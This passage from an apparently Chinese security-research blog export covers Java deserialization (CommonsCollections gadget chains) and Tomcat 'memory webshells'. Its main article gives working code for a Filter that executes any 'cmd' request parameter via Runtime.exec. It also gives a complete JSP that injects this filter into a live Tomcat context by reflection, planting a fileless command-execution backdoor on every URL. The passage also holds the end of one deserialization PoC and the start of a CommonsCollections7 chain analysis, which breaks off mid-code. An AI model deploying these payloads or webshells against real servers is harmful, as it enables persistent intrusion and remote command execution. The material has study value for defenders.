将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221011144759763.png" alt="image-20221011144759763"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马之Filter</title>
      <link href="/2022/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2022/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马之Filter"><a href="#Tomcat内存马之Filter" class="headerlink" title="Tomcat内存马之Filter"></a>Tomcat内存马之Filter</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于 Filter 的知识，在前面<a href="../../01-JavaWeb基础/2-Filter/Filter.md">Filter</a>章节已经学习过，这里不再赘述，直接进入分析环节。</p><h2 id="Filter流程分析"><a href="#Filter流程分析" class="headerlink" title="Filter流程分析"></a>Filter流程分析</h2><p>先编写一个简单的 Filter 实现类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;FilterTest&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问后带上参数执行命令<br><img src="images/image-20221031113025485.png" alt="image-20221031113025485"></p><p>在<code>doFilter()</code>处方法打上断点，看看调用栈<br><img src="images/image-20221031144738930.png" alt="image-20221031144738930"></p><p>从<code>StandardWrapperValve#invoke()</code>方法跟起<br><img src="images/image-20221031144936619.png" alt="image-20221031144936619"></p><p>首先通过<code>ApplicationFilterFactory.createFilterChain()</code>方法创建了一个<code>ApplicationFilterChain</code>类型对象，跟进<code>createFilterChain()</code>方法<br><img src="images/image-20221031145633764.png" alt="image-20221031145633764"></p><p>初始化了<code>ApplicationFilterChain</code>对象，继续往下走<br><img src="images/image-20221031161929404.png" alt="image-20221031161929404"></p><p>接下来获取到了<code>StandardContext</code>类对象<code>context</code>，并通过<code>context.findFilterMaps()</code>方法拿到了<code>filterMaps</code>数组，继续往下走<br><img src="images/image-20221031162125403.png" alt="image-20221031162125403"></p><p>在 if 条件中，请求路径和<code>filterMap</code>设置的规则进行匹配，如果满足则进入 if 条件中，接着根据<code>filterMap</code>对象中存储的<code>filter</code>名称在<code>StandardContext</code>类的<code>filterConfigs</code>寻找<code>filterConfig</code>，如果不为空则通过<code>addFilter()</code>方法添加到<code>filterChain</code>的属性中<br><img src="images/image-20221031162208826.png" alt="image-20221031162208826"></p><p><code>addFilter()</code>方法源码如上图所示，代码逻辑就是进行了去重、扩容并添加<code>filterConfig</code>。</p><p>最后回到<code>StandardWrapperValve</code>类中往下走<br><img src="images/image-20221031151815580.png" alt="image-20221031151815580"></p><p>跟进<code>filterChain.doFilter()</code>方法中<br><img src="images/image-20221031151928083.png" alt="image-20221031151928083"></p><p>继续跟进<code>internalDoFilter()</code>方法<br><img src="images/image-20221031152051403.png" alt="image-20221031152051403"></p><p>创建了<code>ApplicationFilterConfig</code>类对象<code>filterConfig</code>，然后通过<code>filterConfig.getFilter()</code>方法取出<code>filter</code>，接着调用<code>filter.doFilter()</code>方法，跟进后就是我们编写的恶意类<code>FilterTest</code><br><img src="images/image-20221031152224431.png" alt="image-20221031152224431"></p><p>至此步骤算是走完了，总结一下流程：</p><ol><li>通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化<code>ApplicationFilterChain</code>对象；<ul><li>初始化空的<code>ApplicationFilterChain</code>对象；</li><li>获取<code>StandardContext</code>类对象，并中<code>StandardContext</code>类对象中取出<code>FilterMaps</code>数组,<code>FilterMaps</code>数组中的<code>FilterMap</code>存储名称和匹配规则；</li><li>根据<code>FilterMap</code>的名称在<code>StandardContext</code>类的<code>filterConfigs</code>中查找，如果不为空则添加到<code>filterChain</code>对象的属性中；</li></ul></li><li>执行<code>filterChain#doFilter()</code>方法进入编写的恶意实现类<code>FilterTest</code>的<code>doFilter()</code>方法中执行代码。</li></ol><p>接下来再看看<code>Filter</code>的初始化加载流程，把断点打在类名处<br><img src="images/image-20221031160325554.png" alt="image-20221031160325554"></p><p>看看调用栈<br><img src="images/image-20221031160352961.png" alt="image-20221031160352961"></p><p>跟进<code>filterStart()</code>方法<br><img src="images/image-20221031161602064.png" alt="image-20221031161602064"></p><p>遍历 Map 对象<code>filterDefs</code>并获取到<code>entry.getValue()</code>，作为参数传入初始化的<code>ApplicationFilterConfig</code>对象<code>filterConfig</code>，然后通过<code>put()</code>方法把<code>filterConfig</code>添加到<code>filterConfigs</code>中。</p><p>至此我们知道和 filter 有关的三个字段分别为：<code>filterMaps</code>、<code>filterDefs</code>和<code>filterConfigs</code></p><h2 id="Filter内存马的实现"><a href="#Filter内存马的实现" class="headerlink" title="Filter内存马的实现"></a>Filter内存马的实现</h2><p>我们先总结一下这三个字段存储的内容</p><h3 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h3><p><img src="images/image-20221031163323171.png" alt="image-20221031163323171"></p><p>可以看到在<code>filterMaps</code>中以数组的方式存储着 filter 的名称和路径映射信息，其中<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code>是必须的。</p><h3 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h3><p><img src="images/image-20221031163520399.png" alt="image-20221031163520399"></p><p><code>filterDefs</code>以键值对的方式存储<code>filterDef</code>，<code>filterDef</code>为 Map 对象，value 存储着重要的<code>filter</code>、<code>filterClass</code>和<code>filterName</code>。</p><h3 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h3><p><img src="images/image-20221031164103231.png" alt="image-20221031164103231"></p><p><code>filterConfigs</code>存储着当前的上下文<code>StandardContext</code>（WEB 应用），<code>filter</code>对象和<code>filterDef</code>等等信息。</p><p>经过前面的分析，我们可以通过控制上述三个属性的内容达到动态添加恶意 Filter 的目的， 思路如下：</p><ol><li>编写恶意的 Filter 实现类；</li><li>获取<code>StandardContext</code>对象；</li><li>利用<code>FilterDef</code>对<code>filter</code>进行封装；</li><li>创建<code>FilterMap</code>，将<code>filterName</code>和<code>urlPatterns</code>进行绑定（因为 Filter 是按照先后顺序进行调用，所以我们最好把恶意 Filter 放到最前面）</li><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p>最后 Filter 内存马实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">16</span>:<span class="number">51</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;FilterTest&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取StandardContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用FilterDef对filter进行封装</span></span><br><span class="line">    <span class="type">FilterTest</span> <span class="variable">filterTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTest</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filterTest);</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filterTest.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建FilterMap，将filterName和urlPatterns进行绑定</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装filterConfig和filterDef到filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field_filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field_filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) field_filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射创建FilterConfig，并且将filterDef和standardContext作为参数进行传入进行封装filterDe</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到filterConfigs中</span></span><br><span class="line">    filterConfigs.put(filterName,applicationFilterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="images/image-20221031172346671.png" alt="image-20221031172346671"></p><p>接着访问其他路由都可以成功执行命令<br><img src="images/image-20221031172405231.png" alt="image-20221031172405231"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections7利用链分析</title>
      <link href="/2022/11/10/CommonsCollections7/"/>
      <url>/2022/11/10/CommonsCollections7/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections7利用链分析"><a href="#CommonsCollections7利用链分析" class="headerlink" title="CommonsCollections7利用链分析"></a>CommonsCollections7利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于迎来最后一条链子<code>CommonsCollections7</code>，利用条件如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本未知限制</span><br></pre></td></tr></table></figure></p><p>先看<code>ysoserial</code>给出的利用链<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure></p><p>可以看到从<code>LazyMap#get()</code>起后面的都是<code>CommonsCollections1</code>的内容，前面则是新知识点，也是一条寻找了其他能触发<code>LazyMap#get()</code>方法的链子</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>根据 gadget 先跟进<code>Hashtable#readObject()</code>方法源码<br><img src="images/image-20221011152526177.png" alt="image-20221011152526177"></p><p>其中<code>s</code>是我们传入的输入流，分别通过<code>readObject()</code>进行反序列化赋值给<code>key</code>以及<code>value</code>，接着调用<code>reconstitutionPut()</code>方法，继续跟进<br><img src="images/image-20221011152715640.png" alt="image-20221011152715640"></p><p>在<code>reconstitutionPut()</code>方法中，调用了<code>key.equals()</code>方法，这里我们知道<code>key</code>是可控的，根据调用链看，最终是调用了<code>AbstractMap#equals()</code>，我们继续跟进<code>AbstractMap</code>类的<code>equals()</code>方法<br><img src="images/image-20221011153118215.png" alt="image-20221011153118215"></p><p>可以看见最终调用了<code>m.get()</code>方法，也就是如果<code>m</code>可控，则可以完成调用<code>LazyMap#get()</code>方法触发命令执行。在这里，<code>m</code>由传进来的参数<code>o</code>控制，也就是最初的<code>key</code>。</p><p>我们回到原来的<code>Hashtable</code>类，既然在<code>readObject()</code>方法对输入流进行反序列化，那么我们就去看序列化的方法<code>writeObject()</code><br><img src="images/image-20221011153622433.png" alt="image-20221011153622433"></p><p>这里的<code>entryStack.key</code>和<code>entryStack.value</code>则是我们通过<code>put()</code>传入的<code>key</code>和<code>value</code>。因此我们如果<code>put()</code>方法中的<code>key</code>为<code>LazyMap</code>对象的话，最终<code>m</code>则是<code>LazyMap</code>对象。</p><p>这里还剩下一个问题，就是怎么调用到<code>AbstractMap#equals()</code>方法呢？</p><p>首先我们必须构造<code>key</code>为<code>LazyMap</code>对象，最后才能调用到<code>LazyMap#get()</code>。因此我们再回来看看<code>LazyMap</code>类<br><img src="images/image-20221011162909030.png" alt="image-20221011162909030"></p><p>搜索一遍并没有发现<code>LazyMap</code>类有<code>equals()</code>方法，但最后注意到<code>LazyMap</code>类继承于<code>AbstractMapDecorator</code>类，跟进<br><img src="images/image-20221011163120529.png" alt="image-20221011163120529"></p><p><code>AbstractMapDecorator</code>类含有<code>equals()</code>方法。根据前面的学习，我们会构造以下 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br></pre></td></tr></table></figure><p>所以此时的<code>this.map</code>为<code>HashMap</code>类对象，因此接下来会进入<code>HashMap#equals()</code><br><img src="images/image-20221011163412678.png" alt="image-20221011163412678"></p><p>而<code>HashMap</code>又继承于<code>AbstractMap</code>类，因此最终会调用到<code>AbstractMap#equals()</code>方法，整条利用链就通了，妙哉。</p><p>最终 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> 